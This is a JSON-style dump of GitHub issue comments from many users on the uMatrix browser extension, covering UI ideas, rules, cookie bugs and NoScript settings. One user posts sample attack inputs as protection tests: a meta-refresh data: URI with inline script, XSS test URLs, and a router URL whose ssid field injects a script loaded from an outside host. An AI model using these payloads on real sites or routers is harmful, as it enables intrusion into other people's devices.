that\u2019s also my whole take about uMatrix UI. That being said, I must admit I\u2019m not an UI designer, and I have no ideas on how this could be made better. And I care more about its functionalities than it\u2019s UI prettiness. Maybe just change the text color rather than the background one regarding this specific issue? Something like that (very rough draft):\n\n. Yeah, the idea is that the type field could be a list of comma separated types instead of only one.. @foo4thought @ravenise That\u2019s the new UI for the scope selector.\u202f;). See https://github.com/gorhill/uMatrix/issues/182 for the second issue. I can confirm the scroll-bar issue, one website that exhibits this is http://www.frandroid.com.. uMatrix is not responsible for error in the shared rules files AFAIK. You should report to hphosts instead I think.. @gorhill That\u2019s not the correct answer.\u202f;)\n@Certary The correct answer is duplicate of #831 (and in turn of #155 and #54).. As @gorhill pointed, this is filter lists retrieving & updating. So disabling lists should remove connections.. OK, I agree. But aren\u2019t filter lists updated? At least there is a checkbox to \u201cAuto-update\u201c them.. Related: https://bugzilla.mozilla.org/show_bug.cgi?id=1381197. I don\u2019t know, I don\u2019t use this feature currently because I haven\u2019t had the time to read enough about the implications.. That being said, I have a lot of things like:\n22:06:33        failed to delete cookie: http://darkpatterns.org/{persistent-cookie:laravel-session}\nin the log.. OK, I can now see that cookies that should be deleted by Delete blocked cookies don\u2019t get deleted.. 60. Hard is likely not the question. Yet the answer will be \u201cuse uBlock Origin\u201d, because they have different purpose.. Legacy version is not supported anymore. You will have to wait for next ESR (59, in about 3 months I think) to get updated uMatrix.. Though I agree that locking the issue prevented me to +1 last @gorhill post, which is a shame.. You already have two equivalent ways of doing this:\n1. Select the global scope \u201c*\u201d, and turn of workers.\n2. Go to the settings page of uMatrix, then to your rules and add no-workers: * true.. @Atavic And? If no-one reports it, it\u2019s not going to be fixed.. It won\u2019t come back. Spoofing UA is something that should be done very precisely, and the current state of affairs shows that it is really hard. Even for the Tor Browser, as part of their uplift work toward Firefox, they are renouncing in spoofing the UA to a different OS (and same goes for browser, although it does not apply here), because this is very easily detectable. See e.g. how https://browserprint.info/ or https://browserleaks.com/ip can detect the correct OS even with UA spoofing to another.. @guakamole Writing cookies is allowed by uMatrix. Read the doc.. They are currently issues with cookie deletion in some cases, see #878. The minimum interval is set by the browser AFAIK.. Duplicate: https://github.com/gorhill/uMatrix/issues/182. ",
    "warnellw": "@ArchangeGabriel \n\nDoesn\u2019t the * rule just imply that image and css are allowed?\n\nI've considered this the absolute minimum when creating recipes. That is, I assume someone with a very strict ruleset would still globally allow CSS/images (which the * would cover at a bare minimum, and no other resources).\nThat being said, my personal ruleset disallows all 3rd party resources, including CSS/images. I've noticed trackers (e.g. DoubleClick) use images for pixel tracking, so I now consider all 3rd party resources hostile.. ",
    "pwd-github": "This looks good for me. I'm interested in the global rulesets though. Especially for Decentraleyes.. Just a heads up: The jigsaw piece hasn't got a tooltip yet.. Having had a chance to play around properly. I noticed that we can import the rules into the temporary ruleset and then we have to click the padlock to save the rules, that's awesome. It allows us to the tweak the rules to our own needs and that's literally perfect. However once the recipes are imported, there's no way to undo as the eraser doesn't become highlighted. Not so awesome. \nAnd just to add to what I said before, about global rulesets. My reasoning is best demonstrated with Decentraleyes\nDecentraleyes\n    *\n        * cdn.madeupsite.com script allow\n        * cdn.madeupsite2.com script allow\nNow I note that in @warnellw's pull request, @gorhill says that he doesn't believe users should necessarily configure uMatrix for Decentraleyes or via versa, but I'd argue that we're essentially unbreaking the internet for uMatrix users which is essentially Decentraleyes does given the sheer amount of linked everything in webpages these days. I think it's important that users that care, are in a position where they can one-click allow a bunch of CDNs without compromising their privacy. Which brings me to my segue, that's all on the allow side, I'd also like to see something on the block side, as I know I block a bunch of sites wherever possible including google's sites. So if there was a tracking blocklist for the main offenders that I could import via the jigsaw, I'd love that too.\nPWD privacy list\n    *\n        * google-analytics.com * block\n        * googletagmanager.com * block\n        * histats.com * block\nNow the argument would be that those are already covered by the existing hostfiles, but the issue is that you have no control over them. It's like an all of nothing on a massively large scale.\nAnyway, even I've not thought of how to implement it properly, so it's just food for thought at this point in time.. I think just changing the colour of the text as per what @ArchangeGabriel has done with his mockup is a very good and much cleaner idea. \nI would also suggest either using div {\n    cursor:col-resize;\n} or div {\n    cursor:zoom-in;\n} when making the scope smaller and div {\n    cursor:zoom-out;\n} when making the scope bigger to more clearly illustrate the functionality.. ",
    "aleksejrs": "Where do I put my recipes written according to https://github.com/gorhill/uMatrix/wiki/Contributing-ruleset-recipes so that they appear under the puzzle button?. @ArchangeGabriel Actually, there is an \"Import\" control in the Preferences, which accepts one URL per line. It adds the specified file when I press the Apply button, but the \"Import\" checkbox becomes unchecked, the field disappears and the list is lost (the file's GUI entry appears when the preferences UI is reopened), so while using Firefox in an unfamiliar language, I thought it was the Undo button.. At https://www.yandex.ru/\n\n. good 2015-10-19-03-02-27-mozilla-central-firefox-44.0a1.ru.linux-x86_64\nbad  2015-10-20-03-13-17-mozilla-central-firefox-44.0a1.ru.linux-x86_64\n. Maybe (enabling filtering makes it look normal), but\n1. Where is \"1st-party\"?\n2. Why does it start with Firefox Nightly 2015-10-20?\n. Ah, I hadn't really read that paragraph.  0.9.3.0rc2 seems to work properly with the nightlies.\n. As for uBlock Origin, its UI seems to differ enough that I can't immediately tell if anything is wrong.\n. > I think it's time for me to officially release this one\nYes, it's also a problem with Firefox Dev Edition.\n. ",
    "eren-kemer": "It seems like the recipe is not updating with the update now button?\n\nI have updated the list and manually checked the current master version and my version (youtube specifically)\nNote that both versions have the version 1.0\nMy version:\n\nVersion at https://github.com/uBlockOrigin/uAssets/blob/master/recipes/recipes_en.txt : \n\nIs this possibly because of the version staying the same?\nOr is updating of those recipes not implemented correctly yet?\n. I went to uMatrix Settings > Assets > Clicked on 'Ruleset recipes for English websites\u200b\u200b\u200b\u200b\u200b'.\nWhich is essentially a link to moz-extension://69111b79-a6da-48be-84ef-a1ddab966d86/asset-viewer.html?url=recipes_en-0\nOn the top it says\n! uMatrix: Ruleset recipes 1.0 \n! Title: Rulesets for English websites \n! Maintainer: uMatrix\nWhile the latest version also says 1.0:\nhttps://raw.githubusercontent.com/uBlockOrigin/uAssets/master/recipes/recipes_en.txt\n. Shouldn't \"update now\" pull the newest changes though? . ",
    "ahpatel": "Any chance of the element hiding capability of uBlock/HTTPSwitchboard making its way into uMatrix?\nThe main benefit for me would be a lower memory/cpu footprint (1 extension instead of 2) and simplified editing/troubleshooting when rules need to be modified.\n. > That code is also in uBlock, and I think it would be pretty straightforward to import and adapt it to uMatrix.\nThe uBlock method would be more than satisfactory for my use cases.  I haven't noticed any significant 'flickering' when testing with uBlock (at least on my home FIOS and travel 4G mifi)\nOn pages like yahoo.com and a lot of news sites, there are a lot of large ads and that leads to a lot of empty spaces and just makes for bad page flow.  \n\n. @Nojevah  I agree it doesn't apply to all sites; only the ones that use large/obtrusive ads.  I used Yahoo.com as an screenshot in the first post to show how much of the primary viewing area is empty space with uMatrix enabled.  uBlock can collapse these elements so I was hoping I could just enable that same feature in uMatrix (rather than having to install an extra extension).\n. ",
    "mailinglists35": "\nunchecking malware-related hosts files in uBlock is suggested to avoid unneeded overlap.\n\nhi,\nwhat exactly must be unchecked (what should be unchecked in umatrix and what should be unchecked on ublock origin), please?\nusing umatrix and ublock origin from chrome store.\nthank you\n. on umatrix:\n Peter Lowe\u2019s Ad server list\u200e (yoyo.org): 992 used out of 2,422purge cache\non ublock:\n Peter Lowe\u2019s Ad server list\u200e (pgl.yoyo.org): 2,422 used out of 2,422purge cache\nwhich one should be disabled?\n. +1\n@gorhill can we simply use a third-party tool to synchronize some text files or are they unique to each installation?\n. > Extensions are not allowed to create files on a user's file system (for good reasons).\n@gorhill but if we take those files from the local storage from computer 1 and overwrite copy them to a working umatrix storage folder in computer2, will it work? or are they uniquely sticked to a particular browser profile directory?\n. @gorhill what if we create github accounts for example, can you add saving/loading settings to/from it as external storage? (github is just an example; we could have ftp, dropbox, etc). you are already providing export/import to/from file. what would be the easiest online storage support for you?\nobviously this is not really a high priority for your project but more a side task but it would really be useful to end-users managing multiple installations.\n. thanks, but how do I sync across browsers? I'm using it in firefox, chrome, opera... :( it would be more useful to interconnect with api for google drive/dropbox/ other online storage solutions..., then have a simple export/import/sync button...\n. when uMatrix comes to firefox, it will be a hard time to choose between chrome and firefox.\ntired of increasing bloatness of google chrome and their apple-like features policy.\n. dev channel has introduced extensions ability to block webrtc requests. would love to see it integrated into uMatrix!\napi example code: https://code.google.com/p/chromium/issues/detail?id=457629#c7\nI'm using dev anyway so I'd be able to test right away!\nlater edit! oups, i did not read it all: the changes implemented in 457629 let the changes applied by an extension take effect only on restart. an issue tracking the ability to do this without restart has been filed separate here: https://code.google.com/p/chromium/issues/detail?id=466197\n. https://code.google.com/p/hddguardian/issues/detail?id=69\n. thank you, apologies for not thinking about referer! :)\n. gorhill. I want to say this: discovering uMatrix is like reinventing the web browser. it's like all I did since netscape navigator 4 until now was done in darkness and now somebody switched on the lights. seriously. thank you! noscripts and scriptsafe have suddenly become rudimentary archaic toys. \nwhen I first discovered httpsb I though, wtf, this is too fucking awesome but too complicated (that's why i was too lazy to learn httpsb eventually). but uMatrix is really easy.\n. 1. just click the url. file is referenced here http://dcsplus.net/about-us/careers (click any pdf), but that is irrelevant as disabling umatrix extension makes the pdf load, no matter if the pdf is directly accessed (by copying it's url) or clicked in the careers page.\n2. left click\n3. no, it automatically opens with chrome internal pdf viewer if I disable umatrix\nusing chrome Version 43.0.2357.2 dev-m\n. the issue was not reproductible on a second portable instance of stable release 41.\nI have uninstalled and reinstalled the extension and now it's loading.\nI think I might have deleted behind the scene requests :D\n. this is very annoying, because there is a considerable distance on the screen between chrome reload button and umatrix icon that makes the whole process inconvenient.\nthe old behaviour was natural, logical and human. \nplease bring it back, at any cost.\nbefore: click click click on umatrix, tadaaa\nafter: click click click... move mouse to the opposite side, slow down moving to position the mouse pointer on the target 'reload' button, click, move mouse back, slow down to lock on the target 'umatrix' icon, click, click click, move the mouse again five miles west, click, repeat.\n. i know, but that is still annoying\n. this is very annoying, because there is a considerable distance on the screen between chrome reload button and umatrix icon that makes the whole process inconvenient.\nthe old behaviour was natural, logical and human. \nplease bring it back, at any cost.\nbefore: click click click on umatrix, tadaaa\nafter: click click click... move mouse to the opposite side, click, move mouse back, click, click click, move the mouse again five miles west, click, repeat.\n. what does 'invalid' mean here? . what does \"disquettes\" mean? do you mean floppy disk in french language?\ni never suggested a floppy disk icon, even if that appears to be more widespread.\na checkmark would be way more intuitive than a lock.. also if he disagrees, then have the balls to tag it as \"won't fix\" instead. this is definitely not 'invalid'.. > Exporting/importing through a backup file is the workaround\nCan this be performed programatically without user intervention? The people who are using the browser with umatrix don't have the ability to export/import the rules.\n. > I don't plan to ever implement this\nBut would you accept patches if someone else works the entire third party server syncing code?\n. >  Exporting/importing through a backup file is the workaround.\nis there any chance you could add ability to sync to the external file automatically, without the user having to interact with import/export buttons?\nThat way I could handle sending and receiving the file to the users' computer and umatrix would handle syncing with that file.\n. > uMatrix already supports cloud storage\nthat is partially true (only when using the addon in the same type of browser)\nthe subject is about supporting cross-browser syncing.\n\nYou are asking me for a custom feature as if I was a dev for hire\n\nI'm sorry if that is your perception. English is not my mother tongue so maybe some translations you might have interpreted as a personal inquiry. I'm only asking nicely for a new feature.\n. > It is a per site feature. The checkbox in the Privacy pane is to pick a default global setting.\nI'm sorry, but I don't understand how this could be setup so for every site I visit, strict https to be enabled with the exception of .jpg urls?\n. same feature requested in a comment in issue #67 https://github.com/gorhill/uMatrix/issues/67#issuecomment-67506083\n. oh, thank you so much for the clarification! :)\n. @gorhill ok i understand; then can you patch the stable version with fix for #689? (actually fix in #711)\nchrome 57 stable is already out for a whole month and this means every regular user who installs umatrix is affected.\nand that is really annoying and it's happening on about 1/10 of sites I visit using chrome 57. ",
    "berrythesoftwarecodeprogrammar": "inspect the lists you are using and if any of them are hosts files then uncheck them and use them in umatrix instead. and use ublock only for non-hostsfile lists. imo \n. possibly unrelated, but how about adding the little magnifying glass to show all of the url params too? didnt know it existed til i saw https://github.com/gorhill/uBlock/issues/973 but it seems to be uBlock only\n. @gorhill maybe this can be closed?\ni was just testing in the latest version if downloads still fail when behind-the-scene * other is blocked and it seems like they arent anymore. it seems like the context is set to the correct site. was there a fix for that?\n. can just bring up an alert popup with the string selected in a textbox once middle clicked\n. maybe not pretty but at least its only accessible if middle clicked\n. that page pwnd me with noscript set to allow all scripts and ublock and umatrix blocking scripts D:\n. this is all the logger shows:\n13:24:45        --  script  http://evil.hackademix.net/hsb/{inline_script}\n13:24:44            doc http://evil.hackademix.net/hsb/\nit reports that the inline script was blocked but it still works\n. <meta http-equiv=\"refresh\" content=\"0;url=data:text/html,<script>alert('PWND!!! :)')</script>\">\nis the source. you dont even see it with Live HTTP Headers. kinda stupid that it can get around the browser like that and execute javascript\neven with data-scheme blocked by default in umatrix and ublock it gets through\n. i just found out about accessibility.blockautorefresh = true but it doesnt show where the refresh would go if you choose to follow it\n. what ive done is move all 3rd party filters which are like host files, to umatrix and only kept static filtering filters in ublock. i deny everything but css and images for 1st party in umatrix (thus blocking scripts globally). i keep noscript because of its other protections but i set noscript to allow scripts globally, because umatrix will take care of whether or not scripts are allowed on between\n. XSS protection and ABE and stuff. i think it does more than just blocking/allowing scripts/plugins, or so ive read :p \nEDIT: i just found pages to test on and noscript DID protect me from both ABE and XSS even tho scripts are allowed globally on it.\n. XSS:\nhttp://babbage.cs.missouri.edu/~rtdmr6/xss.php?name=%3Cscript%3Ealert%28%22hello%22%29;%3C/script%3E\nhttp://virtual0.cs.missouri.edu/dumb.php?NAME=%20script%3EALERT%2042%20%3B%20%2Fscript%3E#9668079854986958321\nABE:\nhttp://192.168.1.1/index.cgi?active_page=9098&req_mode=0&mimic_button_field=goto%3a+9098..&button_value=9098&ssid=samy%20was%20here%3Cscript%20src=http://samy.pl/mapxss/fiospwn.js%3E%3C/script%3E\nu probably wont come across things like this much thats why it was hard to find examples but noscript has protected me from both things in the past and it probably does more, so i think its worth keeping around for its other features\n. are you sure they have dynamic random subdomains? in my experience, websites which use cloudfront usually only have 1-3 randomized static subdomains and whitelisting those individually the first time is enough. you could also go into the umatrix settings and add a rule manually for it since it wont be available in the popup\ncoursera.com cloudfront.net * allow\nalso see #264 \n. i dont think it will be. (sub)domains are displayed in umatrix based on the public suffix list and gorhill wont change that. whats so hard about adding a rule in manually? that would fix coursera and cloudfront issues for good\n. coursera.com cloudfront.net * allow\nthis is it. it allows every subdomain on cloudfront.net. you dont need  a wildcard symbol\nyou just need to manually add it to your rules\n. @ryanbnl u can do this, see #122 .\ne.g. \nvideosite.com 98.12.43 other allow\nvideosite.com 97.43 other allow\nvideosite.com 121 other allow\n(works like 98.12.43.*, 97.43.*.*, 121.*.*.* etc)\nor if lazy\nvideosite.com * other allow\n(assuming the video falls under 'other')\n. hmm i guess i do?\n```\nhttps://2-edge-chat.facebook.com/pull?channel=p_100009185400624&seq=0&partition=-2&clientid=475e63f0&cb=fa6g&idle=22&qp=y&cap=8&wtc=9%2C1%2C0.000%2C9%2C9&msgs_recv=0&uid=100009185400624&viewer_uid=100009185400624&sticky_token=320&sticky_pool=ash2c06_chat-proxy&state=offline&mode=stream&format=json\nGET /pull?channel=p_100009185400624&seq=0&partition=-2&clientid=475e63f0&cb=fa6g&idle=22&qp=y&cap=8&wtc=9%2C1%2C0.000%2C9%2C9&msgs_recv=0&uid=100009185400624&viewer_uid=100009185400624&sticky_token=320&sticky_pool=ash2c06_chat-proxy&state=offline&mode=stream&format=json HTTP/1.1\nHost: 2-edge-chat.facebook.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\norigin: https://www.facebook.com\nCookie: aa4d9c98f8b33ddbc0360f419fe0de126c0b5807bf245a236a26d95496cd1518\nConnection: keep-alive\nHTTP/1.1 200 OK\naccess-control-allow-credentials: true\naccess-control-allow-origin: https://www.facebook.com\nCache-Control: private, no-store, no-cache, must-revalidate\nContent-Encoding: gzip\nContent-Type: application/json\nDate: Tue, 29 Sep 2015 04:15:13 GMT\nPragma: no-cache\nx-frame-options: DENY\nX-Firefox-Spdy: 3.1\n```\ni encrypted the cookie data\n. and yeah i just looked at my cookie list and all of the facebook ones are set for \".facebook.com\"\n. so like is this an issue? i guess some cross site requests to domains are using cookies without permission and without any indication so that could be an issue. dont know of any other sites where this happens though and in this case its kinda needed for the site to not break\n. thanks\nbut for the websockets and media which i encountered yesterday, they didnt appear in the umatrix logger at all! not even as 'other'\n. oh sorry.  Firefox 40.0.3. the websockets were from github being open. will get examples in a bit\n. hmm i dont get the same behaviour as you @5t3f4n \nublock 1.2.0:\n\numatrix 0.9.2.2b4:\n\n. ok yeah they show up in umatrix logger only in the All tab\n. so @gorhill , i just came across this issue again and decided to recheck. here are my results on Firefox 43.0.4 with uMatrix 0.9.3.3 and uBlock 1.6.4, for github websockets (https://live.github.com/_sockets/*):\nuMatrix:\nsees the source as: github.com\nthinks the content is: other\nuBlock:\nsees the source as: behind-the-scene\nthinks the content is: websocket\nscreenshots below\nuMatrix:\n\nuBlock:\n\nso not only do the content types differ, the source does too\n. yeah thats the main problem. should i close this and open it on the ublock github?\n. oh right. could maybe the domain.multifox part be removed when checking the cookies against the matrix or something then?\n. oh right lol ill try that\n. @gorhill, i realised even with * multifox cookie allow it still does that\n19:37:43        cookie deleted: http://facebook.com.facebook-com-2.multifox/{session-cookie:_js_datr}\n19:37:43        cookie deleted: http://facebook.com.facebook-com-2.multifox/{session-cookie:wd}\n19:37:43        cookie deleted: http://facebook.com.facebook-com-2.multifox/{session-cookie:datr}\n19:37:43        cookie deleted: http://facebook.com.facebook-com-2.multifox/{session-cookie:act}\n19:37:43        cookie deleted: http://facebook.com.facebook-com-2.multifox/{session-cookie:reg_ext_ref}\n19:37:43        cookie deleted: http://facebook.com.facebook-com-2.multifox/{session-cookie:_js_reg_fb_gate}\n19:37:43        cookie deleted: http://facebook.com.facebook-com-2.multifox/{session-cookie:fr}\n19:37:43        cookie deleted: http://facebook.com.facebook-com-2.multifox/{session-cookie:_js_reg_fb_ref}\n19:37:43        cookie deleted: https://facebook.com.facebook-com-2.multifox/{session-cookie:lu}\n19:37:43        cookie deleted: https://facebook.com.facebook-com-2.multifox/{session-cookie:s}\n19:37:43        cookie deleted: http://facebook.com.facebook-com-2.multifox/{session-cookie:csm}\n19:37:43        cookie deleted: https://facebook.com.facebook-com-2.multifox/{session-cookie:c_user}\n19:37:43        cookie deleted: https://facebook.com.facebook-com-2.multifox/{session-cookie:xs}\n. it happens even when both cookie deleting options are disabled \n. nope have both Delete blocked cookies. and Delete non-blocked session cookies unticked.\nuMatrix 0.9.3.1\nFirefox 41.0.2\n. \n\n@gorhill it still happens with everything disabled, at random intervals\nuMatrix 0.9.3.2\nFirefox 43.0.3\nand with * multifox cookie allow in rules\n. ok this is fixed now. maybe by https://github.com/gorhill/uMatrix/commit/e9e1f7e631c96c23a8ca1061f714eeec0a2da830\nDelete blocked cookies and Delete non-blocked session cookies do their jobs properly now and multifox cookies are no longer deleted with both of them off.\nthank you!\n. that method only works for that specific website though.\ni found this http://www.ghacks.net/2015/10/16/how-to-prevent-hsts-tracking-in-firefox/ but clearing the file and setting it to read-only didnt help change the cookie ID (might have to restart the browser).\nit seems to be stored in the site preferences for websites, which you could set to clear but then you might lose other desirable site preferences.\ni wonder what can be done (firefox user)\n. i dont think it comes in the form of a seperate request because nothing shows up in the logger except session cookies from that site and  i have those blocked even. from the wikipedia article it seems like HSTS is set via a http header. maybe the browser then just takes that and stores it in the site preferences for a website.  i dont think this is a problem umatrix would solve\n. this page seems to have some information about where its stored https://support.mozilla.org/en-US/questions/984794\n. i think that code is inserted by umatrix if you have the useragent spoofing enabled. there isnt any evidence that the page location was spoofed? might just be another issue with the nightly\n. test case: https://berr.yt/umatrix.php\nit provides a link to the latest umatrix xpi. once downloading, the scope for my site changes to a github amazonaws url\n. do you have behind-the-scene connections blocked? i was doing experimenting yesterday with behind-the-scene * * block and it seems any kind of download falls under other, even images etc. if you're saving something it falls under other and its origin is behind-the-scene. not sure if its the same with saving pages but im guessing it is. so blocking behind-the-scene breaks all downloads unless you whitelist * for other\n. yeah i figured\n. OP shouldnt be having this problem unless they blocked behind-the-scene requests \n. also i saw some issues about stripping the urls and having an option to let the user proceed to the redirect url, but how umatrix wont get in the business of url modifying. i understand.\nalso the issue about temporary whitelisting domains. i guess that could work in this case, but if its a domain which one clicks on often, i doubt having to click 'temporarily allow' every time would be a good solution.\nfrom what i understand, the current way umatrix works with hosts file domains is like ublock's strict blocking except it cant be disabled. am i wrong? if not, is there any plan to make it easier to allow documents or something?\n. oh my god perfect. i tried 'document' didnt know there was a doc. thanks.\nis there a list of  all the request types?\n. oooh yeah that makes sense.\nnow that i know this, i dont mind manually adding in doc allow rules if sites are blocked in hosts files. but maybe on the block pages, there could be a button which would add a doc allow? might make it easier for people who want to 'whitelist' websites which appear in hosts files they use\n. @gorhill so for dynamic rules in umatrix, the following content types can be used:\n*\ndoc\ncookie\ncss\nimage\nplugin\nscript\nxhr\nframe\nother\nhow about with ublock? could you link me to a list or some code which shows the content types allowed for both static and dynamic rules in ublock? i found different pieces of code but couldnt figure out which ones were right\n. thanks!\nbut  thats not exactly true for ublock and dynamic filters right? because the logger shows things like xhr, other etc but when added as dynamic filters they disappear. only static filters i guess\n. oh right sorry\n. look at the lists. the ones which are just lists of hostnames are hosts files which can be used in umatrix.\ni think somewhere in the wiki of either addon, gorhill talked about the usefulness of having the same hosts files enabled in both ublock and umatrix. i personally disabled the hosts files in ublock and put them into umatrix and use ublock only for other filters\n. i think its better to leave useragent spoofing to addons specifically designed for such a thing\nfor firefox you can use either:\nRandom Agent Spoofer\nor \nUAControl with User-Agent JS Fixer\n. User-Agent JS Fixer which i linked, complements other addons including UAControl, by changing the javascript useragent to the same one as the header. it requires no configuration, it just adds the javascript feature to other useragent addons\n. @crssi works fine here. I use Random Agent Spoofer + UAControl + User-Agent JS Fixer. RAS chooses a random useragent profile for all sites by default and I use UAControl for when I want to use a specific useragent for a site. It is able to override RAS. The JS Fixer then just writes the same values from UAControl into the javascript objects. You can test it here, http://browserspy.dk/browser.php . I just tested with the latest versions and it's still working.\n. did noscript have a per domain option for that? if you want to block them completely maybe check out gfx.downloadable_fonts.enabled and/or browser.display.use_document_fonts. or if you want fine control then yeah you might have to use ublock\n. just put those in your user.js. maybe check out https://github.com/pyllyukko/user.js\nfirefox removed the preference which dealt with plugin enumeration but if you have noscript installed you can make the following preferences:\nnoscript.surrogate.noplugin.exceptions = a whitelist of websites to allow plugin enumeration on (when they detect flash that way or something e.g. .abc.net.au .domain.com\nnoscript.surrogate.noplugin.replacement = Object.defineProperty(navigator, \"plugins\", {value: []});\nnoscript.surrogate.noplugin.sources = @^https?://\nthis will make your plugins list appear to be empty to all sites except those in the exception preference\n. go to your firefox profile and you will see prefs.js, and possibly user.js. prefs.js is where all about:config entries are stored and it shouldnt be edited manually. you can just add/edit those preferences in about:config OR make a file called user.js and add the following lines:\nuser_pref(\"noscript.surrogate.noplugin.exceptions\",\".abc.net.au .dailyliked.net\");\nuser_pref(\"noscript.surrogate.noplugin.replacement\",\"Object.defineProperty(navigator, \\\"plugins\\\", {value: []});\");\nuser_pref(\"noscript.surrogate.noplugin.sources\",\"@^https?://\");\nits not a userscript. its a file which firefox reads when it starts up and loads the entries into about:config. its a way to make sure you have some static preferences which dont get changed easily as the browser will set them each time you start it. the user.js i linked you to is an effort to make a user.js which protects the user's privacy and security. i dont use that one exactly but my user.js uses a lot of the preferences they have. \nanother example of a user.js line can be:\nuser_pref(\"layout.css.visited_links_enabled\",false);\n. and yes it works, if you have noscript. it uses noscripts surrogate feature which lets you make preferences that run scripts on different pages. this script empties the plugins list on every domain except the ones you add to exceptions. you can test it here http://browserspy.dk/plugins.php\nit works. you can see in my exceptions list i have .abc.net.au and .dailyliked.net because i let those sites see my plugin list (because they seem to rely on that to run flash). you could probably modify the preference or make a new one which can only expose flash to those sites instead of all plugins but i didnt bother to because i dont even encounter many sites which need plugins anymore.\nalso about the questions you asked gorhill, i think he might say that umatrix's job isnt to prevent fingerprinting, its only to prevent network requests. i use umatrix for that and use other addons/preferences to stop fingerprinting\n. tl;dr: you can combat plugin enumeration by creating about:config preferences which use noscript's script surrogate feature. the same can also be achieved by adding said preferences to a user.js file which makes it easier to manage your own important preferences\n(im not the best at explaining stuff, hope you got it)\n. oh i see :) thanks for correcting me\n. i use noscript that way too, surrogates work regardless of those settings :)\n. 1. ctrl+t (open a new tab)\n2. type \"about:config\" enter\n3. search \"noplugin\"\n4. double click the noscript.surrogate.noplugin.exceptions entry\n5. it brings up a popup with the exception list and you can just append the new site e.g. .videosite.com\n6. press enter and close tab\n\n. @gorhill is the fix for this in any way related to https://github.com/gorhill/uMatrix/issues/385 ? i dont completely understand what the fix does but i updated and im watching my logger to see if it still deletes non blocked cookies. it seems to be leaving the cookies alone so far.\n. yes seems like its fixed and both Delete blocked cookies and Delete non-blocked session cookies do their jobs properly now. \n. if you just want to avoid the about:addons page connecting to google analytics just do this:\nmatrix-off: about-scheme true\nmatrix-off: addons.about-scheme false\naddons.about-scheme mozilla.net * allow\n(only turn the matrix on for about:addons and whitelist only *.mozilla.net. doesnt seem like it needs to connect to any other domains)\n. and maybe show which hosts file the offending domain resides in? or maybe this has been requested many times before and its not possible after the lists are merged. \nedit: just saw https://github.com/gorhill/uMatrix/issues/526 lol\n. woops forgot to add:\nFirefox 45.0.1 (updated today)\nuMatrix 0.9.3.3\n. this issue is going to be closed since you haven't provided any details at all\n. so its not blocking anything? what browser? what version of the addon? what do you see in the matrix? what do you see in the logger? what rules do you have?\n. ok i can reproduce this with the url https://chrome.google.com/webstore/detail/umatrix/ogfcmafjalglgifnmanfmnieipoejdcf?hl=en\ndoesnt happen in firefox. happens in chromium with any chrome.google.com url. the matrix shows as empty and nothing appears in the logger for those tabs. even with everything blocked and matrix enabled for *\nChromium 52.0.2739.0 (64-bit)\nuMatrix 0.9.3.3\nthats odd. is it google tampering or intended? works fine on other google subdomains\n. the same happens with ublock on chromium it seems\n. just use the Refcontrol addon\n. ",
    "alejandrolemus": "Thanks for clarification, what you explain makes sense and that logic applies to me. I just assumed it would reload 'always' from what I read in that feature's explanation, maybe as a way to show users how different a page behave with a particular feature on or off. So the description was sort of misleading, not the implementation.\n. >  the description says \"display\"\nYes, that and \"whenever\" were the ones. And thanks for all the time you put into this :)\n. It's working fine here. Reloaded, changed tabs, closed and reopened config page, tried with 30 and 0 as opposed to the default 50.\n. Also, from the translation strings, I assume you are dropping the \u00b5 character. If so, you missed the one showing right there in the dashboard. No big deal, just reporting.\n. FWIW, it's Firefox 37.0.2 in Windows 7. I didn't check/uncheck those (at least I don't remember doing it), only ticked both Convenience options and updated the filterslist\nEdit: I saw your previous after posting, please disregard\n. Since you were asking for suggestions, instead of logging the rotation, maybe you could just highlight (or use some kind of icon) the currently active ua-string on the Dashboard, where all strings are listed.\n. > especially on Firefox, for whatever reason the buttons are more spaced despite same CSS\nI got the opposite with uMatrix 0.9.0.1, Chrome wastes more space than Firefox (Windows 7 32-bits). It looks like one more icon can be squeezed in there, with some CSS fine-tuning?\n\n. See https://github.com/gorhill/uMatrix/issues/198. From the release notes of version 0.9.0.0 (Other changes):\n- Smart reload is gone:\n  - Code was too complicated for what I consider a non-essential feature, compromising uMatrix's stability (my main goal).\n  - The code relied in part on behavior specific to Chromium.\n  - After using uBlock for weeks, months, I now favor having the user reload on his own when he decides so. I like it this way personally. You will quickly get used to it.\n  - The matrix can be stickied in the logger, rendering auto-reload irrelevant.\n  - The auto-reload code was not completely reliable anyway, it did not always accomplish its purpose (because point 1. and 2. above)\n. ",
    "Skibicki": "Tested again: Results appeared after allowing http://www.google-analytics.com.\n. Sorry about that. Thanks for the filter tip.\n. ",
    "Quurks": "This seems to be an attempt to prevent session hijacking, a normal user is unlikely to change the UA while logged in, so its assumed an attacker acquired the session and its terminated\n. Hyperlink Auditing has the same target, but relies on a different mechanism\n. At least my Opera Beta installation didn't auto-update uMatrix and uBlock. There are newer version available in the store, but they aren't updated automatically. Is it setup to autoupdate? https://developer.chrome.com/extensions/autoupdate\n. Demo (not VPN specific): https://github.com/diafygi/webrtc-ips\nChrome bugtracker: https://code.google.com/p/chromium/issues/detail?id=333752\n. ",
    "Cilverjolt": "i have panda free, voodooshield, comodofirewall. i tried disabling all my security things and it still happened. it still restores but its annoying that chrome crashes\n. okay i will do that\n. so i reset my flags to default for chrome and it didn't crash. So sorry for bothering you it must have been a buggy chrome flag that i enabled.\n. I'm using windows 8.1. \n. I did the steps above and it worked fine. I notice it happens randomly. I tested last night activating two flags at a time to see what was crashing it and I couldn't find it. When I tried to restore from file earlier today it randomly crashed. So I'm confused as to what is causing it.\n. Delete local storage content set by blocked hostnames is on\nClear browser cache every   60 minutes. is on\nSpoof HTTP referrer string of third-party requests. is on\nStrict HTTPS: forbid mixed content. is on\nBlock all hyperlink auditing attempts. is on\nI used the button to disable matrix filtering for this scope\nK i found which one it was. it was \"Strict HTTPS: forbid mixed content. \" that was messing with it.\n. ",
